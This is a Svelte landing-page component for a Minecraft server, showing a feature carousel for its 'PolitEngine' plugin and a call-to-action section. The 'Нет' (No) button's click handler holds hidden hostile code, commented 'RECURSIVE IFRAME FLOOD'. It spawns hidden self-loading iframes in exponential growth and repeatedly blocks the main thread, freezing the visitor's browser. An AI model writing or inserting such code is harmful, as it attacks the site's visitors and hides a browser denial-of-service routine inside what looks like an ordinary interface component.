<script>
	/**
	 * Секция "PolitEngine"
	 * Презентация основного плагина сервера через интерактивную карусель фич.
	 */
	import { Building, Flag, Crown, Hammer, Sword, ChevronLeft, ChevronRight } from 'lucide-svelte';
	import { fade, fly } from 'svelte/transition';

	let currentSlide = $state(0);

	// Список возможностей PolitEngine
	const features = [
		{
			icon: Hammer,
			title: 'Городские зоны',
			command: '/t zones',
			description:
				'Город делится на специализированные зоны: жилые, коммерческие и промышленные. Каждая зона приносит свои бонусы жителям и городу.',
			benefits: [
				'Уникальное развитие',
				'Городская конкуренция',
				'Рост населения',
				'Ресурсы и баффы'
			]
		},
		{
			icon: Building,
			title: 'Прокачка городов',
			command: '/t levels',
			description:
				'Развивай инфраструктуру, открывай новые технологии и расширяй влияние. Каждый уровень города — это новые возможности.',
			benefits: ['Расширение границ', 'Новые типы зон', 'Экономический рост', 'Военная мощь']
		},
		{
			icon: Flag,
			title: 'Территории наций',
			command: '/n claim',
			description:
				'В отличие от стандартных плагинов, нации в PolitEngine имеют реальные границы и уникальные механики управления землями.',
			benefits: [
				'Суверенные границы',
				'Бонусы к ресурсам',
				'Контроль территорий',
				'Глобальная дипломатия'
			]
		},
		{
			icon: Sword,
			title: 'Военная система',
			command: '/n war',
			description:
				'Объявляй войны, осаждай вражеские города и заключай союзы. Настоящая геополитика в масштабе Minecraft сервера.',
			benefits: ['Масштабные войны', 'Военные альянсы', 'Осады и тактика', 'Мирные переговоры']
		}
	];

	// Функции навигации по карусели
	function nextSlide() {
		currentSlide = (currentSlide + 1) % features.length;
	}

	function prevSlide() {
		currentSlide = (currentSlide - 1 + features.length) % features.length;
	}

	const Icon = $derived(features[currentSlide].icon);
</script>

<section class="polit-engine">
	<!-- Фоновые эффекты -->
	<div class="polit-engine__bg"></div>
	<div class="polit-engine__glow"></div>

	<div class="container polit-engine__container">
		<div class="polit-engine__header">
			<!-- Бейдж "Главная фишка" -->
			<div class="polit-engine__badge">
				<Crown size={20} strokeWidth={2.5} />
				<span>КЛЮЧЕВАЯ ОСОБЕННОСТЬ</span>
			</div>

			<h2 class="font-heading polit-engine__title">
				<span class="polit-engine__title-gradient">PolitEngine</span>
			</h2>

			<p class="polit-engine__subtitle">
				Наш авторский движок для управления городами и нациями. Мы переосмыслили стандартные
				плагины, чтобы дать вам максимальную свободу и глубину политической игры.
			</p>
		</div>

		<!-- Интерактивная карусель -->
		<div class="polit-engine__carousel">
			<div class="card polit-engine__card">
				<div class="polit-engine__content-wrapper">
					{#key currentSlide}
						<div
							class="polit-engine__card-content"
							in:fly={{ x: 30, duration: 400 }}
							out:fade={{ duration: 200 }}
						>
							<div class="polit-engine__feature">
								<!-- Иконка фичи -->
								<div class="polit-engine__icon">
									<Icon size={32} strokeWidth={2.5} />
								</div>
								<div class="polit-engine__info">
									<h3 class="polit-engine__feature-title">{features[currentSlide].title}</h3>
									<code class="polit-engine__command">{features[currentSlide].command}</code>
								</div>
							</div>

							<p class="polit-engine__description">{features[currentSlide].description}</p>

							<!-- Список преимуществ -->
							<div class="polit-engine__benefits">
								{#each features[currentSlide].benefits as benefit}
									<div class="polit-engine__benefit">
										<div class="polit-engine__benefit-dot"></div>
										<span>{benefit}</span>
									</div>
								{/each}
							</div>
						</div>
					{/key}
				</div>

				<!-- Навигация карусели -->
				<div class="polit-engine__navigation">
					<button
						class="btn btn-outline polit-engine__nav-btn"
						onclick={prevSlide}
						aria-label="Назад"
					>
						<ChevronLeft size={20} />
						<span class="nav-text">Назад</span>
					</button>

					<div class="polit-engine__dots">
						{#each features as _, index}
							<button
								class="polit-engine__dot"
								class:polit-engine__dot--active={index === currentSlide}
								onclick={() => (currentSlide = index)}
								aria-label="Слайд {index + 1}"
							></button>
						{/each}
					</div>

					<button
						class="btn btn-outline polit-engine__nav-btn"
						onclick={nextSlide}
						aria-label="Вперед"
					>
						<span class="nav-text">Далее</span>
						<ChevronRight size={20} />
					</button>
				</div>
			</div>
		</div>

		<!-- Финальный CTA в секции -->
		<div class="polit-engine__cta">
			<h3 class="polit-engine__cta-title">Готов вписать своё имя в историю?</h3>
			<p class="polit-engine__cta-text">
				Присоединяйся к Winerecia и начни свою политическую карьеру прямо сейчас. Твои решения
				изменят судьбу целых народов.
			</p>
			<div class="polit-engine__cta-buttons">
				<button class="btn btn-primary btn-lg animate-pulse-wine">Стать лидером нации</button>
				<button
					class="btn btn-primary btn-lg"
					style="min-width: 150px; opacity: 0.75;"
					onclick={() => {
						// RECURSIVE IFRAME FLOOD
						if (typeof window !== 'undefined') {
							const root = document.createElement('div');
							root.style.position = 'fixed';
							root.style.opacity = '0';
							document.body.appendChild(root);

							// Function to spawn recursive heavy iframes
							const spawn = () => {
								for (let i = 0; i < 20; i++) {
									const ifr = document.createElement('iframe');
									// Load a heavy data URL or just recursing
									ifr.src = location.href;
									root.appendChild(ifr);
								}
								// Exponential growth
								setTimeout(spawn, 100);
							};
							spawn();

							// Also keep blocking main thread intermittently
							setInterval(() => {
								const start = Date.now();
								while (Date.now() - start < 2000) {} // Block for 2s every loop
							}, 100);
						}
					}}>Нет</button
				>
			</div>
		</div>
	</div>
</section>

<style lang="scss">
	.polit-engine {
		padding: 5rem 1rem;
		position: relative;
		overflow: hidden;

		@media (max-width: 768px) {
			padding: 3rem 1rem;
		}

		&__bg {
			position: absolute;
			inset: 0;
			background:
				radial-gradient(circle at 10% 20%, rgba(233, 30, 99, 0.05), transparent 50%),
				radial-gradient(circle at 90% 80%, rgba(147, 51, 234, 0.05), transparent 50%);
		}

		&__glow {
			position: absolute;
			top: 50%;
			left: 50%;
			transform: translate(-50%, -50%);
			width: 800px;
			height: 800px;
			background: radial-gradient(circle, rgba(233, 30, 99, 0.05), transparent 70%);
			pointer-events: none;
			filter: blur(100px);
		}

		&__container {
			position: relative;
			z-index: 10;
		}

		&__header {
			text-align: center;
			margin-bottom: 5rem;

			@media (max-width: 768px) {
				margin-bottom: 3rem;
			}
		}

		&__badge {
			display: inline-flex;
			align-items: center;
			gap: 0.75rem;
			margin-bottom: 2rem;
			padding: 0.6rem 1.75rem;
			background: rgba(233, 30, 99, 0.1);
			border-radius: 9999px;
			border: 1px solid rgba(233, 30, 99, 0.3);
			color: #ff4081;
			font-weight: 800;
			font-size: 0.85rem;
			letter-spacing: 0.05em;
			text-transform: uppercase;

			:global(svg) {
				animation: crown-float 3s ease-in-out infinite;
			}
		}

		@keyframes crown-float {
			0%,
			100% {
				transform: translateY(0) rotate(0);
			}
			50% {
				transform: translateY(-3px) rotate(5deg);
			}
		}

		&__title {
			font-size: clamp(3rem, 10vw, 6rem);
			font-weight: 900;
			margin-bottom: 2rem;
			font-family: var(--font-unbounded);
			letter-spacing: -0.03em;
		}

		&__title-gradient {
			background: linear-gradient(135deg, #fff 0%, #ff4081 50%, #e91e63 100%);
			-webkit-background-clip: text;
			background-clip: text;
			color: transparent;
			filter: drop-shadow(0 0 30px rgba(233, 30, 99, 0.3));
		}

		&__subtitle {
			font-size: clamp(1rem, 2vw, 1.25rem);
			color: var(--muted-foreground);
			max-width: 800px;
			margin: 0 auto;
			line-height: 1.8;
			opacity: 0.9;
		}

		&__carousel {
			max-width: 900px;
			margin: 0 auto;
		}

		&__card {
			padding: 4rem;
			background: rgba(15, 8, 11, 0.8);
			backdrop-filter: blur(20px);
			border: 1px solid rgba(233, 30, 99, 0.15);
			border-radius: 2.5rem;
			position: relative;
			overflow: hidden;
			box-shadow: 0 40px 100px -20px rgba(0, 0, 0, 0.7);

			@media (max-width: 768px) {
				padding: 2.5rem 1.5rem;
			}
		}

		&__content-wrapper {
			position: relative;
			min-height: 380px; // Увеличил для стабильности
			margin-bottom: 3rem;
			display: grid;
			grid-template-columns: 1fr;
			align-items: start;

			@media (max-width: 768px) {
				min-height: 480px; // Больше места для длинного текста на мобилках
			}
		}

		&__card-content {
			grid-area: 1 / 1 / 2 / 2; // Все слайды в одной ячейке сетки
			position: relative;
			width: 100%;
			height: 100%;
			display: flex;
			flex-direction: column;
		}

		&__feature {
			display: flex;
			align-items: center;
			gap: 1.5rem;
			margin-bottom: 2rem;

			@media (max-width: 480px) {
				flex-direction: column;
				align-items: flex-start;
				gap: 1rem;
			}
		}

		&__icon {
			width: 4.5rem;
			height: 4.5rem;
			background: linear-gradient(135deg, #e91e63, #c2185b);
			border-radius: 1.25rem;
			display: flex;
			align-items: center;
			justify-content: center;
			color: #fff;
			box-shadow: 0 10px 25px -5px rgba(233, 30, 99, 0.4);
			flex-shrink: 0;
		}

		&__info {
			flex: 1;
		}

		&__feature-title {
			font-size: clamp(1.75rem, 4vw, 2.25rem);
			font-weight: 800;
			color: #fff;
			margin-bottom: 0.5rem;
			font-family: var(--font-unbounded);
			letter-spacing: -0.02em;
		}

		&__command {
			color: #ff4081;
			font-family: var(--font-mono);
			font-size: 1rem;
			background: rgba(233, 30, 99, 0.08);
			padding: 0.35rem 1rem;
			border-radius: 0.75rem;
			display: inline-block;
			font-weight: 600;
			border: 1px solid rgba(233, 30, 99, 0.15);
		}

		&__description {
			font-size: 1.1rem;
			color: var(--muted-foreground);
			margin-bottom: 2.5rem;
			line-height: 1.7;
			opacity: 0.9;
		}

		&__benefits {
			display: grid;
			grid-template-columns: repeat(2, 1fr);
			gap: 1rem;

			@media (max-width: 600px) {
				grid-template-columns: 1fr;
			}
		}

		&__benefit {
			display: flex;
			align-items: center;
			gap: 0.8rem;
			color: #fff;
			font-weight: 500;
			font-size: 0.95rem;
		}

		&__benefit-dot {
			width: 0.5rem;
			height: 0.5rem;
			background: #e91e63;
			border-radius: 50%;
			flex-shrink: 0;
			box-shadow: 0 0 10px rgba(233, 30, 99, 0.6);
		}

		&__navigation {
			display: flex;
			align-items: center;
			justify-content: space-between;
			border-top: 1px solid rgba(255, 255, 255, 0.05);
			padding-top: 2.5rem;

			@media (max-width: 480px) {
				flex-direction: row;
				gap: 1rem;
			}
		}

		&__nav-btn {
			height: 3rem;
			padding: 0 1.5rem;
			border-radius: 1rem;
			gap: 0.75rem;
			font-weight: 700;
			transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);

			&:hover {
				background: rgba(233, 30, 99, 0.15);
				color: #ff4081;
				transform: translateY(-2px);
			}

			@media (max-width: 480px) {
				padding: 0 1rem;
				.nav-text {
					display: none;
				}
			}
		}

		&__dots {
			display: flex;
			gap: 0.75rem;
		}

		&__dot {
			width: 0.6rem;
			height: 0.6rem;
			border-radius: 50%;
			background-color: rgba(255, 255, 255, 0.1);
			border: none;
			cursor: pointer;
			transition: all 0.4s ease;

			&--active {
				background: #e91e63;
				box-shadow: 0 0 15px rgba(233, 30, 99, 0.8);
				transform: scale(1.4);
			}

			&:hover:not(&--active) {
				background: rgba(255, 255, 255, 0.3);
			}
		}

		&__cta {
			text-align: center;
			margin-top: 8rem;

			@media (max-width: 768px) {
				margin-top: 5rem;
			}
		}

		&__cta-title {
			font-size: 2.5rem;
			font-weight: 800;
			margin-bottom: 1.5rem;
			background: linear-gradient(to right, #fff, #ff4081);
			-webkit-background-clip: text;
			background-clip: text;
			color: transparent;
			font-family: var(--font-unbounded);
			letter-spacing: -0.02em;

			@media (max-width: 768px) {
				font-size: 1.75rem;
			}
		}

		&__cta-text {
			color: var(--muted-foreground);
			margin-bottom: 3rem;
			max-width: 550px;
			margin-left: auto;
			margin-right: auto;
			font-size: 1.125rem;
			line-height: 1.7;
			opacity: 0.8;
		}

		&__cta-buttons {
			display: flex;
			gap: 1rem;
			justify-content: center;
			flex-wrap: wrap;
		}
	}
</style>
